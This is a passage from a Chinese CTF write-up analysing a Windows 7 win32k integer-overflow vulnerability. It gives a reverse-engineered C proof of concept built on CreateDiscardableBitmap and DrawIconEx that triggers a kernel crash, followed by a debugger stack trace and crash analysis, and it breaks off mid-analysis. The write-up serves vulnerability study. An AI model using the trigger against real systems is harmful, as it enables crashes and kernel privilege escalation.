**作者:[wjllz](https://redogwu.github.io/2018/11/02/windows-kernel-exploit-part-3/ "wjllz")  
来源：[先知安全技术社区](https://xz.aliyun.com/t/3135 "先知安全技术社区") **
## 前言
DDCTF的学习在我[github](https://github.com/redogwu)上面更新完了那个库, 由于我之前做过`整数溢出`的学习,
加上做第二题的时候已经知道这是一个`整数溢出`的漏洞, and windows7的保护措施少的可怜, 所以我当时和师父说, 我觉得蛮简单的样子,
然后师父说, 是么, 那么把你看过的东西全忘了再做一遍. 于是... 对不起, 打扰了.
这篇文章的过程我会把自己的分析思路给贴出来. 离写出利用到写这篇博客已经过了很久了, 在这个过程当中对内核学习也有了新的看法. 现在的我觉得,
分析是最难的部分. 所以这篇文章会冗长一点. 希望您不要介意.
这篇文章主要分为一下几个部分
    [+] poc分析 --> 定位漏洞点
    [+] 内核代码分析 --> 定位可以利用的数据
    [+] fengshui: 构造可利用的数据
    [+] run shellcode: 进行提权
Let's Go
## POC 分析
### 环境准备
下载的文件打开截图如下:
查阅资料得知`UUENCODE`加密, 改后缀名为`uu`, 之后采用`winrar`解压即可.
### 逆向POC文件
说是逆向. 其实就是一个F5的过程. 如下:
于是我整理了一下源码(循环不方便调试, 所以我把循环去掉了. 之后发现还是可行的):
    #include 
    #include 
    /*
    * triggerVul:
    *   [+] 触发此漏洞
    */
    VOID triggerTheVul()
    {
        HDC hDc; // edi@1
        HDC hdcCall; // esi@1
        HICON hIcon; // ebx@1
        HBITMAP hBitMap; // eax@1
        HBRUSH i; // esi@1
        hDc = GetWindowDC(0);
        hdcCall = CreateCompatibleDC(hDc);
        hIcon = LoadIconW(0, (LPCWSTR)0x7F02);
        hBitMap = CreateDiscardableBitmap(hdcCall, 0xDEAD000, 0x1); // 这个地方分配的大小得改为0x18
        i = CreatePatternBrush(hBitMap);
        __debugbreak();
        DrawIconEx(hDc, 0, 0x11223344, hIcon, 0x5566, 0x7788, 0x12345678u, i, 8u);
    }
    int main()
    {
        std::cout  为F820 0000, 值很大(请留意这个结论)
        ==> ???? 代表不可访问
        ==> 向不能访问的地方进行了写操作
    [+] 发生在vSrcCopyS1D32当中
##### 崩溃原因
查阅windows的文档:
留意:
    [+] 崩溃的原因是由于对非法的内存进行了写操作
#### 崩溃堆栈
堆栈信息的每一项的格式如下
    ebp 函数返回地址 第一个参数 第二个参数 ...
由上面的思路我们可以记录如下信息
    98065145 win32k!vSrcCopyS1D32+0xa5
    9b20f840 win32k!EngCopyBits+0x604
    9b20f900 win32k!EngRealizeBrush+0x462
    9b20f998 win32k!bGetRealizedBrush+0x70c
    9b20f9b0 win32k!pvGetEngRbrush+0x1f
    9b20fa14 win32k!EngBitBlt+0x2bf
    9b20fa78 win32k!GrePatBltLockedDC+0x22b
    9b20fb24 win32k!GrePolyPatBltInternal+0x176
    9b20fb60 win32k!GrePolyPatBlt+0x45
    9b20fba8 win32k!_DrawIconEx+0x153
    9b20fc00 win32k!NtUserDrawIconEx+0xcb
    9b20fc00 nt!KiFastCallEntry+0x12a
    001af930 ntdll!KiFastSystemCallRet
    001af934 USER32!NtUserDrawIconEx+0xc
    001af990 USER32!DrawIconEx+0x260
### 推测漏洞类型
### 分析
首先, 在IDA当中获取崩溃指令的位置:
c代码对应如下:
这里我要吹一个叫做`source insight`的阅读源码的工具. 极大的方便了我阅读源码的过程. 此处在windows NT4对应的源码如下:
是不是感觉有点慌, 什么都看不懂了, 这些变量名又是干啥的呢. 没关系的, 我们来整合一下资源.
    [+] 变量名猜测这应该是做类似于由jSrc(源)向pulDst(目的地址)的赋值操作.
    [+] 由源码可以推出v17类似于pjSrc的长度
    [+] 复杂的部分可以通过调试器来验证它.
### 调试器部分的分析
首先, 采用IDA逆向一下关键函数`vSrcCopyS1D32`:
可以得到参数只有一个, 且是一个指针. 接着我们在`vSrcCopyS1D32`函数起始的地方设下断点. 运行到此, 打印出指针的值以及其对应的结构体内容.
运行到崩溃指令处.
我们看下`windows nt`源码里面的各项定义:
可以看到`eax`的值是和`pjDst`联系起来的. 有前面的源码我们推测出`v17`类似于字符串长度. 不如来验证他.
使用`IDA`找到v17对应的汇编指令.
在windbg当中运行到此打印出其值:
由于不小心失误多操作了一次, 所以我们的值多减了一次一, 在后面我把它加回来了. `1bd5a000`就是我们推测的长度.
对应`BLTINFO`结构体成员变量`lDeltaSrc`, 在其中我发现了一句有趣的注释:
所以验证了我的长度推测. 只是它复制的不是字符串. 而是其他的东西.
如果有点绕的话让我们来总结一下目前获得的信息:
    [+] pulDst指向目标地址
    [+] jSrc指向了目标字符串.
    [+] 由jSrc向pulDst运送v17长度的东西A
接下来开始我们的推测之旅.
#### 第一步
如果是我们自己写字符串操作的话. 大概如下:
    int len = 20;
    char * Dst = memset(len);
    for(int i = 0; i < 20; i++) // 注意这里
        Dst[i] = Src[i];
什么时候会崩溃呢. 比如:
    int len = 20
    char * Dst = memset(len);
    for(int i = 0; i < 20+0x1000; i++)  // 注意这里
        Dst[i] = Src[i];
由前面的分析我们知道了他是一个写操作. 所以应该是目的`字符串`(代指)与其`长度`不匹配照成的. 为什么会不匹配. 由于这个地址的字符串长度比较大,